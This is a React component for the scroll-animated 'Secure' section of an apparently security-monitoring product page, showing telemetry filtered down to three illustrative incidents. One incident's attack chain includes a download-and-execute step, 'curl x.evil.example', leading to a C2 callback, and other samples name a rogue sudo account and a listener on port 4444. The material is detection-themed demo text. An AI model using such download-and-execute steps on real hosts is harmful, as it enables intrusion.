import { motion, useMotionValueEvent, useScroll } from "motion/react";
import { useMemo, useRef, useState } from "react";
import { useCopy } from "@/i18n";
import { ChapterHead, DemoBadge, EASE, type Flow } from "./chapter";

// 每一道闸之后还剩多少（示意量级），以及点阵里留几个点。
const STAGES = [
  { count: 2_481_906, dots: 220 },
  { count: 10_000, dots: 150 },
  { count: 1_214, dots: 90 },
  { count: 431, dots: 50 },
  { count: 27, dots: 18 },
  { count: 3, dots: 3 },
];

const COPY = {
  "zh-CN": {
    kicker: "安全",
    title: (
      <>
        噪音，止步于此。
        <br />
        <span className="text-neutral-500">留下的，都值得一看。</span>
      </>
    ),
    body: "进程、文件、登录、外连，主机一上线就源源不断。\n往下滚，看它们一层层被筛掉。",
    flow: { reads: ["遥测", "情报", { you: "你批准的抑制" }], writes: ["告警", "事件单"] } as Flow,
    demo: "示意数据",
    stages: [
      ["全部遥测", "agent、流量探针与 syslog，一天的量"],
      ["命中规则与情报", "Sigma 规则，加上 IP、域名、哈希情报"],
      ["合并重复", "同一主机、同一规则，只留一条"],
      ["滤掉已知误报", "你掐掉的噪声，可撤销，会过期"],
      ["串成事件", "按主机、进程血缘和用户，连成一个故事"],
      ["值得你看的", "AI 查证后定性，低危良性 7 天后自动结案"],
    ],
    incidents: [
      {
        host: "web-01",
        title: "SSH 爆破得手后下载执行",
        verdict: "恶意 · 96%",
        chain: ["sshd", "bash", "curl x.evil.example", "/tmp/.x", "c2 外连（情报命中）"],
      },
      { host: "db-01", title: "新增 sudo 账户 tmpadmin", verdict: "可疑 · 需复核" },
      { host: "gw-01", title: "首次出现的进程监听 4444 端口", verdict: "可疑 · 需复核" },
    ],
    closed: "其余 24 件，AI 判为低危良性，到期自动结案，全程留痕。",
    scroll: "继续滚动",
  },
  en: {
    kicker: "Secure",
    title: (
      <>
        Noise stops here.
        <br />
        <span className="text-neutral-500">What's left is worth your time.</span>
      </>
    ),
    body: "Processes, files, logons, connections. Once a host is online, they never stop.\nScroll, and watch them filtered away, layer by layer.",
    flow: { reads: ["telemetry", "intel", { you: "suppressions you approved" }], writes: ["alerts", "incidents"] } as Flow,
    demo: "Illustrative",
    stages: [
      ["All telemetry", "a day from agents, sensors and syslog"],
      ["Rule & intel hits", "Sigma rules, plus IP, domain and hash intel"],
      ["Duplicates merged", "same host, same rule, one alert"],
      ["Known noise muted", "what you've silenced — revocable, and it expires"],
      ["Stitched into incidents", "by host, process lineage and user"],
      ["Worth your time", "verified by AI; low-risk benign ones close in 7 days"],
    ],
    incidents: [
      {
        host: "web-01",
        title: "SSH brute force, then download & execute",
        verdict: "Malicious · 96%",
        chain: ["sshd", "bash", "curl x.evil.example", "/tmp/.x", "C2 (intel hit)"],
      },
      { host: "db-01", title: "New sudo account tmpadmin", verdict: "Suspicious · review" },
      { host: "gw-01", title: "First-seen process listening on 4444", verdict: "Suspicious · review" },
    ],
    closed: "The other 24: low-risk and benign. Closed on schedule, every step on record.",
    scroll: "Keep scrolling",
  },
};

/** 稳定的伪随机点位，避免每次渲染跳动。 */
function useDots(n: number) {
  return useMemo(() => {
    let seed = 7;
    const rand = () => ((seed = (seed * 16807) % 2147483647) / 2147483647);
    return Array.from({ length: n }, () => ({ x: rand() * 100, y: rand() * 100, s: 0.6 + rand() * 0.8 }));
  }, [n]);
}

export function Funnel() {
  const t = useCopy(COPY);
  const ref = useRef<HTMLDivElement>(null);
  const [stage, setStage] = useState(0);
  const { scrollYProgress } = useScroll({ target: ref, offset: ["start start", "end end"] });
  useMotionValueEvent(scrollYProgress, "change", (p) =>
    setStage(Math.min(STAGES.length - 1, Math.max(0, Math.floor(p * STAGES.length * 1.05)))),
  );
  const dots = useDots(STAGES[0].dots);
  const visible = STAGES[stage].dots;
  const last = stage === STAGES.length - 1;

  return (
    <section id="secure" className="relative scroll-mt-20">
      {/* 窄屏标题放在吸顶区之前；宽屏放进吸顶区左栏，免得标题和漏斗之间空出一整屏 */}
      <div className="mx-auto max-w-[1400px] px-4 pt-28 sm:px-6 lg:hidden lg:px-8">
        <ChapterHead index="03" kicker={t.kicker} title={t.title} body={t.body} flow={t.flow} tone="rose" />
      </div>
      {/* 滚动驱动：外层撑出滚动距离，内层吸顶，按滚动进度推进闸门 */}
      <div ref={ref} className="relative h-[360vh]">
      <div className="sticky top-0 flex h-screen items-center overflow-hidden px-4 sm:px-6 lg:px-8">
        <div className="mx-auto grid w-full max-w-[1400px] gap-6 lg:grid-cols-2 lg:items-center lg:gap-10">
          <div>
            <p className="mb-4 font-mono text-xs uppercase tracking-[0.22em] text-rose-300 lg:hidden">03 · {t.kicker}</p>
            <div className="mb-10 hidden lg:block">
              <ChapterHead index="03" kicker={t.kicker} title={t.title} body={t.body} flow={t.flow} tone="rose" />
            </div>
            <div className="relative">
              {/* 左侧进度线随滚动填满 */}
              <div className="absolute bottom-2 left-0 top-2 w-px bg-white/10" />
              <motion.div
                className="absolute bottom-2 left-0 top-2 w-px origin-top bg-gradient-to-b from-neutral-300 to-rose-400"
                style={{ scaleY: scrollYProgress }}
              />
              <ol className="space-y-0.5 pl-3 sm:space-y-1">
                {t.stages.map(([name, desc], i) => (
                  <li
                    key={name}
                    className={`flex items-baseline gap-4 rounded-lg px-3 py-1 transition-all duration-500 sm:py-2 ${
                      i === stage ? "bg-white/[0.06]" : ""
                    } ${i > stage ? "opacity-30" : ""}`}
                  >
                    <span className="w-24 shrink-0 text-right font-mono text-sm tabular-nums text-white sm:w-28">
                      {STAGES[i].count.toLocaleString()}
                    </span>
                    <span>
                      <span className={`text-sm ${i === stage ? "text-white" : "text-neutral-400"}`}>{name}</span>
                      {i === stage && <span className="mt-0.5 hidden text-xs text-neutral-500 sm:block">{desc}</span>}
                    </span>
                  </li>
                ))}
              </ol>
            </div>
          </div>

          <div className="relative">
            <div className="flex items-end justify-between gap-4">
              <div>
                <motion.p
                  key={stage}
                  initial={{ opacity: 0, y: 12, filter: "blur(6px)" }}
                  animate={{ opacity: 1, y: 0, filter: "blur(0px)" }}
                  transition={{ duration: 0.5, ease: EASE }}
                  className={`font-mono text-5xl font-medium tabular-nums tracking-tight sm:text-7xl ${
                    last ? "text-rose-300" : "text-white"
                  }`}
                >
                  {STAGES[stage].count.toLocaleString()}
                </motion.p>
                <p className="mt-1 text-sm text-neutral-500">{t.stages[stage][0]}</p>
              </div>
              <DemoBadge label={t.demo} />
            </div>
            <div className="relative mt-4 h-[130px] sm:mt-6 sm:h-[220px]">
              <div
                className={`pointer-events-none absolute inset-0 rounded-full blur-3xl transition-colors duration-1000 ${
                  last ? "bg-rose-500/15" : "bg-white/[0.03]"
                }`}
              />
              {dots.map((d, i) => {
                const keep = i < visible;
                return (
                  <motion.span
                    key={i}
                    className="absolute h-2 w-2 rounded-full"
                    style={{ left: `${d.x}%`, top: `${d.y}%` }}
                    animate={{
                      opacity: keep ? (last ? 1 : 0.35 + d.s * 0.3) : 0,
                      scale: keep ? (last ? 3 : d.s) : 0.2,
                      left: last && keep ? `${18 + i * 32}%` : `${d.x}%`,
                      top: last && keep ? "45%" : `${d.y}%`,
                      backgroundColor: last ? "#fb7185" : stage >= 4 ? "#fda4af" : "#d4d4d4",
                      boxShadow: last ? "0 0 24px 4px rgba(251,113,133,0.6)" : "0 0 8px 1px rgba(255,255,255,0.15)",
                    }}
                    transition={{ duration: 0.9, ease: EASE, delay: keep ? 0 : (i % 17) * 0.015 }}
                  />
                );
              })}
            </div>

            <div className="mt-4 min-h-[240px] sm:mt-6">
              {last ? (
                <div className="space-y-3">
                  {t.incidents.map((inc, i) => (
                    <motion.div
                      key={inc.host}
                      initial={{ opacity: 0, y: 16 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.6, ease: EASE, delay: 0.15 * i }}
                      className={`rounded-xl border p-4 ${
                        i === 0 ? "border-rose-400/30 bg-rose-500/[0.07]" : "border-white/10 bg-white/[0.03]"
                      }`}
                    >
                      <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-sm">
                        <span className="font-mono text-xs text-neutral-500">{inc.host}</span>
                        <span className="text-white">{inc.title}</span>
                        <span className={`ml-auto text-xs ${i === 0 ? "text-rose-300" : "text-amber-300"}`}>
                          {inc.verdict}
                        </span>
                      </div>
                      {inc.chain && (
                        <div className="mt-3 flex flex-wrap items-center gap-1.5 font-mono text-[11px]">
                          {inc.chain.map((node, n) => (
                            <span key={node} className="flex items-center gap-1.5">
                              {n > 0 && <span className="text-rose-300/60">→</span>}
                              <span className="rounded bg-black/40 px-1.5 py-0.5 text-rose-100">{node}</span>
                            </span>
                          ))}
                        </div>
                      )}
                    </motion.div>
                  ))}
                  <motion.p
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.6 }}
                    className="pt-1 text-xs text-neutral-500"
                  >
                    {t.closed}
                  </motion.p>
                </div>
              ) : (
                <p className="pt-20 text-center text-xs uppercase tracking-[0.2em] text-neutral-600">↓ {t.scroll}</p>
              )}
            </div>
          </div>
        </div>
      </div>
      </div>
    </section>
  );
}
